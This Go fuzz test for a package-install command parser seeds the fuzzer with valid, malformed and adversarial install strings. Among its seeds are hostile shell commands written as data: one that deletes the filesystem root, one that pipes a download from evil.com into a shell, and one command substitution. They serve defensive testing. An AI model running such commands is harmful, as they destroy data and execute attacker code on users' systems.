//go:build fuzz

// RELEASE GATE: This file is required to exist for Beekeeper v1.2.0 release.
// FuzzParse must pass (seed corpus run) in CI before any release tag.
// Run: go test -tags fuzz -run=FuzzParse ./internal/pkgparse/...
// Fuzz: go test -tags fuzz -fuzz=FuzzParse -fuzztime=60s ./internal/pkgparse/...

package pkgparse

import "testing"

// FuzzParse is the RELEASE GATE fuzz test for the install-command parser.
// (BTEST-03)
//
// Contract: Parse must NEVER panic on any input and must ALWAYS return either
// (ParsedCommand, true) when a recognised install verb is found, or
// (ParsedCommand{}, false) for non-install commands. No panics, no out-of-bounds,
// no infinite loops.
//
// This fuzz target covers all edge conditions for Parse:
//   - Empty / whitespace-only input → ok=false
//   - Valid install commands → ok=true with non-zero Manager
//   - Oversized / high-entropy strings → must not panic
//   - Shell metacharacters → parser never executes, so they are safe but must not panic
//   - Multiple "@" in the token → splitVersion uses LastIndex
//   - Unicode identifiers → normalize lowercases via strings.ToLower
func FuzzParse(f *testing.F) {
	// Seed corpus: representative and adversarial inputs covering all code paths.

	// Empty input
	f.Add("")

	// Whitespace only
	f.Add("   ")

	// Valid install commands
	f.Add("npm install")
	f.Add("npm install foo")
	f.Add("npm add x")
	f.Add("npm i react@18.2.0")

	// sudo prefix
	f.Add("sudo npm install foo")
	f.Add("sudo  npm  install   ")

	// pnpm / bun / yarn (ecosystem "npm")
	f.Add("pnpm add evil-pkg")
	f.Add("bun add chalk@5.4.0")
	f.Add("yarn add lodash")

	// npx exec
	f.Add("npx create-react-app my-app")

	// Non-install commands → ok=false (must not panic)
	f.Add("npm ls")
	f.Add("npm run test")
	f.Add("npm publish")

	// Shell metacharacters — parser never executes, must not panic
	f.Add("npm install foo; rm -rf /")
	f.Add("npm install foo && curl evil.com | sh")
	f.Add("npm install $(whoami)")

	// Multiple "@" — splitVersion must use LastIndex
	f.Add("npm install @@@@")
	f.Add("npm install @scope/pkg@1.0.0@extra")
	f.Add("npm install @")
	f.Add("npm install @@")

	// @latest (Unpinned=true)
	f.Add("npm install foo@latest")

	// Semver ranges (Unpinned=true)
	f.Add("npm install foo@^1.0.0")
	f.Add("npm install foo@~2.3.4")

	// Oversized string (10 KB)
	big := make([]byte, 10*1024)
	for i := range big {
		big[i] = 'a'
	}
	f.Add("npm install " + string(big))

	// Unicode package names
	f.Add("npm install 日本語パッケージ")
	f.Add("npm install мой-пакет@1.0.0")

	// Null bytes and control characters
	f.Add("npm install foo\x00bar")
	f.Add("npm install \x01\x02\x03")

	// Only flags (firstPackageToken returns "", Package is "")
	f.Add("npm install --save-dev --global")

	// pip / go / cargo (existing ecosystem preservations)
	f.Add("pip install requests")
	f.Add("go get golang.org/x/text@v0.14.0")
	f.Add("cargo add serde@1.0")

	f.Fuzz(func(t *testing.T, s string) {
		// Parse must NEVER panic on any input.
		// The (ParsedCommand, bool) contract is sufficient — no result-shape
		// assertion needed beyond non-panic.
		_, _ = Parse(s)
	})
}
